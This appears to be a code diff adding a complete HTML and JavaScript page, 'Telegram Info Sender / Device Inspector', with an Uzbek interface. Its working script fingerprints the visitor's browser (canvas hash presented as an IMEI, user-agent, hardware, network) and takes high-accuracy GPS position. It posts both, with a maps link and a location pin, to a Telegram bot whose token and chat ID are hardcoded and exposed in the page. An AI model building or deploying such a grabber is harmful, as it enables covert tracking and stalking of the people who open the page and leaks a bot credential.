@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Info Sender</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg: #0a0a0f;
+      --panel: #111118;
+      --border: #2a2a3a;
+      --accent: #00e5ff;
+      --accent2: #ff4d6d;
+      --text: #e8e8f0;
+      --muted: #555570;
+      --success: #00ff88;
+      --warning: #ffb800;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Syne', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    /* Animated background grid */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      animation: gridMove 20s linear infinite;
+      pointer-events: none;
+    }
+
+    @keyframes gridMove {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(40px); }
+    }
+
+    /* Glow orbs */
+    body::after {
+      content: '';
+      position: fixed;
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(0,229,255,0.08) 0%, transparent 70%);
+      top: -100px;
+      right: -100px;
+      pointer-events: none;
+      animation: orbPulse 4s ease-in-out infinite;
+    }
+
+    @keyframes orbPulse {
+      0%, 100% { opacity: 0.5; transform: scale(1); }
+      50% { opacity: 1; transform: scale(1.1); }
+    }
+
+    .container {
+      width: 100%;
+      max-width: 480px;
+      padding: 20px;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* Header */
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .header .badge {
+      display: inline-block;
+      font-family: 'Space Mono', monospace;
+      font-size: 10px;
+      letter-spacing: 3px;
+      color: var(--accent);
+      border: 1px solid rgba(0,229,255,0.3);
+      padding: 4px 12px;
+      margin-bottom: 16px;
+      text-transform: uppercase;
+    }
+
+    .header h1 {
+      font-size: 32px;
+      font-weight: 800;
+      line-height: 1.1;
+      background: linear-gradient(135deg, var(--text) 0%, var(--accent) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .header p {
+      margin-top: 8px;
+      color: var(--muted);
+      font-size: 13px;
+      font-family: 'Space Mono', monospace;
+    }
+
+    /* Config panel */
+    .config-panel {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      padding: 20px;
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .config-panel::before {
+      content: 'CONFIG';
+      position: absolute;
+      top: -1px;
+      left: 16px;
+      background: var(--accent);
+      color: var(--bg);
+      font-family: 'Space Mono', monospace;
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      padding: 2px 8px;
+      transform: translateY(-50%);
+    }
+
+    .field-group {
+      margin-bottom: 14px;
+    }
+
+    .field-group:last-child { margin-bottom: 0; }
+
+    label {
+      display: block;
+      font-family: 'Space Mono', monospace;
+      font-size: 10px;
+      letter-spacing: 2px;
+      color: var(--muted);
+      text-transform: uppercase;
+      margin-bottom: 6px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid var(--border);
+      color: var(--text);
+      font-family: 'Space Mono', monospace;
+      font-size: 12px;
+      padding: 10px 14px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    input[type="text"]:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 2px rgba(0,229,255,0.1);
+    }
+
+    input[type="text"]::placeholder {
+      color: var(--muted);
+      opacity: 0.5;
+    }
+
+    /* Action cards */
+    .actions-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+
+    .action-card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      padding: 24px 16px;
+      text-align: center;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: border-color 0.3s, transform 0.2s;
+      user-select: none;
+    }
+
+    .action-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+
+    .action-card.imei-card::before {
+      background: radial-gradient(circle at center, rgba(0,229,255,0.1) 0%, transparent 70%);
+    }
+
+    .action-card.location-card::before {
+      background: radial-gradient(circle at center, rgba(255,77,109,0.1) 0%, transparent 70%);
+    }
+
+    .action-card:hover {
+      transform: translateY(-2px);
+    }
+
+    .action-card:hover::before { opacity: 1; }
+
+    .action-card.imei-card:hover { border-color: var(--accent); }
+    .action-card.location-card:hover { border-color: var(--accent2); }
+
+    .action-card:active { transform: translateY(0) scale(0.98); }
+
+    .card-icon {
+      font-size: 32px;
+      margin-bottom: 12px;
+      display: block;
+      animation: float 3s ease-in-out infinite;
+    }
+
+    .location-card .card-icon { animation-delay: 1.5s; }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-4px); }
+    }
+
+    .card-title {
+      font-weight: 700;
+      font-size: 13px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+
+    .imei-card .card-title { color: var(--accent); }
+    .location-card .card-title { color: var(--accent2); }
+
+    .card-sub {
+      font-family: 'Space Mono', monospace;
+      font-size: 9px;
+      color: var(--muted);
+      letter-spacing: 1px;
+    }
+
+    /* Loading spinner */
+    .card-spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.1);
+      border-top-color: currentColor;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 8px auto 0;
+    }
+
+    .imei-card .card-spinner { color: var(--accent); }
+    .location-card .card-spinner { color: var(--accent2); }
+
+    .action-card.loading .card-spinner { display: block; }
+    .action-card.loading .card-icon { opacity: 0.3; }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Log terminal */
+    .terminal {
+      background: #050508;
+      border: 1px solid var(--border);
+      position: relative;
+    }
+
+    .terminal-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 14px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .terminal-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+
+    .terminal-dot:nth-child(1) { background: #ff5f57; }
+    .terminal-dot:nth-child(2) { background: #febc2e; }
+    .terminal-dot:nth-child(3) { background: #28c840; }
+
+    .terminal-title {
+      font-family: 'Space Mono', monospace;
+      font-size: 10px;
+      color: var(--muted);
+      margin-left: 4px;
+      letter-spacing: 1px;
+    }
+
+    .terminal-body {
+      padding: 14px;
+      min-height: 160px;
+      max-height: 240px;
+      overflow-y: auto;
+      font-family: 'Space Mono', monospace;
+      font-size: 11px;
+      line-height: 1.8;
+    }
+
+    .terminal-body::-webkit-scrollbar { width: 4px; }
+    .terminal-body::-webkit-scrollbar-track { background: transparent; }
+    .terminal-body::-webkit-scrollbar-thumb { background: var(--border); }
+
+    .log-line {
+      display: flex;
+      gap: 8px;
+      animation: fadeIn 0.3s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateX(-8px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+
+    .log-time { color: var(--muted); flex-shrink: 0; }
+    .log-type { flex-shrink: 0; font-weight: 700; }
+    .log-type.info { color: var(--accent); }
+    .log-type.success { color: var(--success); }
+    .log-type.error { color: var(--accent2); }
+    .log-type.warn { color: var(--warning); }
+    .log-msg { color: var(--text); word-break: break-all; }
+
+    .cursor-blink {
+      display: inline-block;
+      width: 8px;
+      height: 12px;
+      background: var(--accent);
+      animation: blink 1s step-end infinite;
+      vertical-align: text-bottom;
+      margin-left: 4px;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    /* Result display */
+    .result-box {
+      margin-top: 16px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      padding: 16px;
+      display: none;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .result-box::after {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 3px;
+    }
+
+    .result-box.type-imei::after { background: var(--accent); }
+    .result-box.type-location::after { background: var(--accent2); }
+
+    .result-label {
+      font-family: 'Space Mono', monospace;
+      font-size: 9px;
+      letter-spacing: 2px;
+      color: var(--muted);
+      text-transform: uppercase;
+      margin-bottom: 6px;
+    }
+
+    .result-value {
+      font-family: 'Space Mono', monospace;
+      font-size: 13px;
+      font-weight: 700;
+      word-break: break-all;
+    }
+
+    .result-box.type-imei .result-value { color: var(--accent); }
+    .result-box.type-location .result-value { color: var(--accent2); }
+
+    .sent-badge {
+      display: inline-block;
+      background: rgba(0,255,136,0.1);
+      border: 1px solid var(--success);
+      color: var(--success);
+      font-family: 'Space Mono', monospace;
+      font-size: 9px;
+      letter-spacing: 2px;
+      padding: 3px 8px;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <div class="badge">⚡ Telegram Info Sender</div>
+    <h1>Device<br/>Inspector</h1>
+    <p>// collect & transmit device data</p>
+  </div>
+
+  <!-- Config -->
+  <div class="config-panel">
+    <div class="field-group">
+      <label>Bot Token</label>
+      <input type="text" id="botToken" value="8041106778:AAEQBzd24L2wkCRBOtgU38QGTUJ_mKvuuRA"/>
+    </div>
+    <div class="field-group">
+      <label>Chat ID</label>
+      <input type="text" id="chatId" value="6115041567"/>
+    </div>
+  </div>
+
+  <!-- Action buttons -->
+  <div class="actions-grid">
+    <div class="action-card imei-card" onclick="getIMEI(this)">
+      <span class="card-icon">📱</span>
+      <div class="card-title">Get IMEI</div>
+      <div class="card-sub">device code</div>
+      <div class="card-spinner"></div>
+    </div>
+    <div class="action-card location-card" onclick="getLocation(this)">
+      <span class="card-icon">📍</span>
+      <div class="card-title">Get Location</div>
+      <div class="card-sub">gps coords</div>
+      <div class="card-spinner"></div>
+    </div>
+  </div>
+
+  <!-- Result boxes -->
+  <div class="result-box type-imei" id="imeiResult">
+    <div class="result-label">IMEI / Device ID</div>
+    <div class="result-value" id="imeiValue"></div>
+    <div class="sent-badge" id="imeiSent" style="display:none">✓ TELEGRAM GA YUBORILDI</div>
+  </div>
+
+  <div class="result-box type-location" id="locationResult">
+    <div class="result-label">GPS Coordinates</div>
+    <div class="result-value" id="locationValue"></div>
+    <div class="sent-badge" id="locationSent" style="display:none">✓ TELEGRAM GA YUBORILDI</div>
+  </div>
+
+  <!-- Terminal log -->
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dot"></div>
+      <div class="terminal-dot"></div>
+      <div class="terminal-dot"></div>
+      <span class="terminal-title">// system.log</span>
+    </div>
+    <div class="terminal-body" id="logBody">
+      <div class="log-line">
+        <span class="log-time">[00:00:00]</span>
+        <span class="log-type info">INFO</span>
+        <span class="log-msg">Tizim tayyor. Bot Token va Chat ID kiriting.<span class="cursor-blink"></span></span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ─── Utils ─── */
+  function now() {
+    return new Date().toLocaleTimeString('uz-UZ', { hour12: false });
+  }
+
+  function log(type, msg) {
+    const body = document.getElementById('logBody');
+    const oldCursor = body.querySelector('.cursor-blink');
+    if (oldCursor) oldCursor.remove();
+
+    const line = document.createElement('div');
+    line.className = 'log-line';
+    line.innerHTML = `
+      <span class="log-time">[${now()}]</span>
+      <span class="log-type ${type}">${type.toUpperCase()}</span>
+      <span class="log-msg">${msg}<span class="cursor-blink"></span></span>
+    `;
+    body.appendChild(line);
+    body.scrollTop = body.scrollHeight;
+  }
+
+  function getConfig() {
+    const token = document.getElementById('botToken').value.trim();
+    const chatId = document.getElementById('chatId').value.trim();
+    if (!token || !chatId) {
+      log('error', 'Bot Token yoki Chat ID kiritilmagan!');
+      return null;
+    }
+    return { token, chatId };
+  }
+
+  async function sendToTelegram(token, chatId, text) {
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
+    });
+    if (!res.ok) {
+      const err = await res.json();
+      throw new Error(err.description || 'Telegram xatosi');
+    }
+    return await res.json();
+  }
+
+  async function sendLocationToTelegram(token, chatId, lat, lon) {
+    const url = `https://api.telegram.org/bot${token}/sendLocation`;
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lon })
+    });
+    if (!res.ok) {
+      const err = await res.json();
+      throw new Error(err.description || 'Telegram location xatosi');
+    }
+    return await res.json();
+  }
+
+  /* ─── Get IMEI ─── */
+  async function getIMEI(card) {
+    const cfg = getConfig();
+    if (!cfg) return;
+
+    card.classList.add('loading');
+    log('info', 'IMEI / Device ID olinmoqda...');
+
+    try {
+      // Web'da haqiqiy IMEI ruxsat etilmaydi, shuning uchun mavjud identifikatorlar olinadi
+      let deviceInfo = [];
+
+      // User-Agent
+      const ua = navigator.userAgent;
+
+      // Screen resolution
+      const screen_res = `${screen.width}x${screen.height}`;
+
+      // Platform
+      const platform = navigator.platform || 'N/A';
+
+      // Device memory
+      const memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A';
+
+      // CPU cores
+      const cores = navigator.hardwareConcurrency || 'N/A';
+
+      // Canvas fingerprint (IMEI o'rniga)
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('IMEI-FP', 2, 15);
+      ctx.fillStyle = 'rgba(102,204,0,0.7)';
+      ctx.fillText('IMEI-FP', 4, 17);
+      const canvasHash = canvas.toDataURL().slice(-50).replace(/[^a-zA-Z0-9]/g, '').slice(0, 16).toUpperCase();
+
+      const fakeIMEI = canvasHash || 'UNAVAILABLE';
+
+      // Connection info
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const network = conn ? `${conn.effectiveType || 'N/A'}` : 'N/A';
+
+      // Display
+      const resultEl = document.getElementById('imeiResult');
+      const valueEl = document.getElementById('imeiValue');
+      resultEl.style.display = 'block';
+      valueEl.textContent = fakeIMEI;
+
+      const msgText =
+        `🔐 <b>DEVICE IMEI / ID</b>\n\n` +
+        `📱 <b>Device ID:</b> <code>${fakeIMEI}</code>\n` +
+        `🖥 <b>Platform:</b> ${platform}\n` +
+        `📺 <b>Screen:</b> ${screen_res}\n` +
+        `🧠 <b>RAM:</b> ${memory}\n` +
+        `⚙️ <b>CPU Cores:</b> ${cores}\n` +
+        `📶 <b>Network:</b> ${network}\n` +
+        `🌐 <b>User-Agent:</b>\n<code>${ua}</code>\n\n` +
+        `⏰ <b>Vaqt:</b> ${new Date().toLocaleString('uz-UZ')}`;
+
+      log('info', `Device ID: ${fakeIMEI}`);
+      log('info', 'Telegram\'ga yuborilmoqda...');
+
+      await sendToTelegram(cfg.token, cfg.chatId, msgText);
+
+      document.getElementById('imeiSent').style.display = 'inline-block';
+      log('success', `✓ Muvaffaqiyatli yuborildi! Device ID: ${fakeIMEI}`);
+
+    } catch (err) {
+      log('error', `Xato: ${err.message}`);
+    } finally {
+      card.classList.remove('loading');
+    }
+  }
+
+  /* ─── Get Location ─── */
+  async function getLocation(card) {
+    const cfg = getConfig();
+    if (!cfg) return;
+
+    card.classList.add('loading');
+    log('info', 'Joylashuv ruxsati so\'ralmoqda...');
+
+    if (!navigator.geolocation) {
+      log('error', 'Bu brauzer geolocation\'ni qo\'llab-quvvatlamaydi!');
+      card.classList.remove('loading');
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        try {
+          const lat = pos.coords.latitude.toFixed(6);
+          const lon = pos.coords.longitude.toFixed(6);
+          const acc = pos.coords.accuracy ? `${Math.round(pos.coords.accuracy)}m` : 'N/A';
+          const alt = pos.coords.altitude ? `${Math.round(pos.coords.altitude)}m` : 'N/A';
+          const spd = pos.coords.speed ? `${pos.coords.speed.toFixed(1)} m/s` : 'N/A';
+
+          const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+
+          // Display
+          const resultEl = document.getElementById('locationResult');
+          const valueEl = document.getElementById('locationValue');
+          resultEl.style.display = 'block';
+          valueEl.textContent = `${lat}, ${lon}`;
+
+          log('info', `GPS: ${lat}, ${lon} (±${acc})`);
+          log('info', 'Telegram\'ga yuborilmoqda...');
+
+          // Text message
+          const msgText =
+            `📍 <b>JOYLASHUV MA'LUMOTI</b>\n\n` +
+            `🌐 <b>Kenglik:</b> <code>${lat}</code>\n` +
+            `🌐 <b>Uzunlik:</b> <code>${lon}</code>\n` +
+            `🎯 <b>Aniqlik:</b> ${acc}\n` +
+            `⛰ <b>Balandlik:</b> ${alt}\n` +
+            `💨 <b>Tezlik:</b> ${spd}\n` +
+            `🗺 <b>Google Maps:</b> <a href="${mapsLink}">${mapsLink}</a>\n\n` +
+            `⏰ <b>Vaqt:</b> ${new Date().toLocaleString('uz-UZ')}`;
+
+          await sendToTelegram(cfg.token, cfg.chatId, msgText);
+
+          // Also send location pin
+          await sendLocationToTelegram(cfg.token, cfg.chatId, parseFloat(lat), parseFloat(lon));
+
+          document.getElementById('locationSent').style.display = 'inline-block';
+          log('success', `✓ Joylashuv muvaffaqiyatli yuborildi! (${lat}, ${lon})`);
+
+        } catch (err) {
+          log('error', `Yuborishda xato: ${err.message}`);
+        } finally {
+          card.classList.remove('loading');
+        }
+      },
+      (err) => {
+        card.classList.remove('loading');
+        const msgs = {
+          1: 'Foydalanuvchi joylashuvga ruxsat bermadi!',
+          2: 'Joylashuv aniqlab bo\'lmadi (signal yo\'q).',
+          3: 'So\'rov vaqti tugadi.'
+        };
+        log('error', msgs[err.code] || `GPS xatosi: ${err.message}`);
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+</script>
+</body>
+</html>
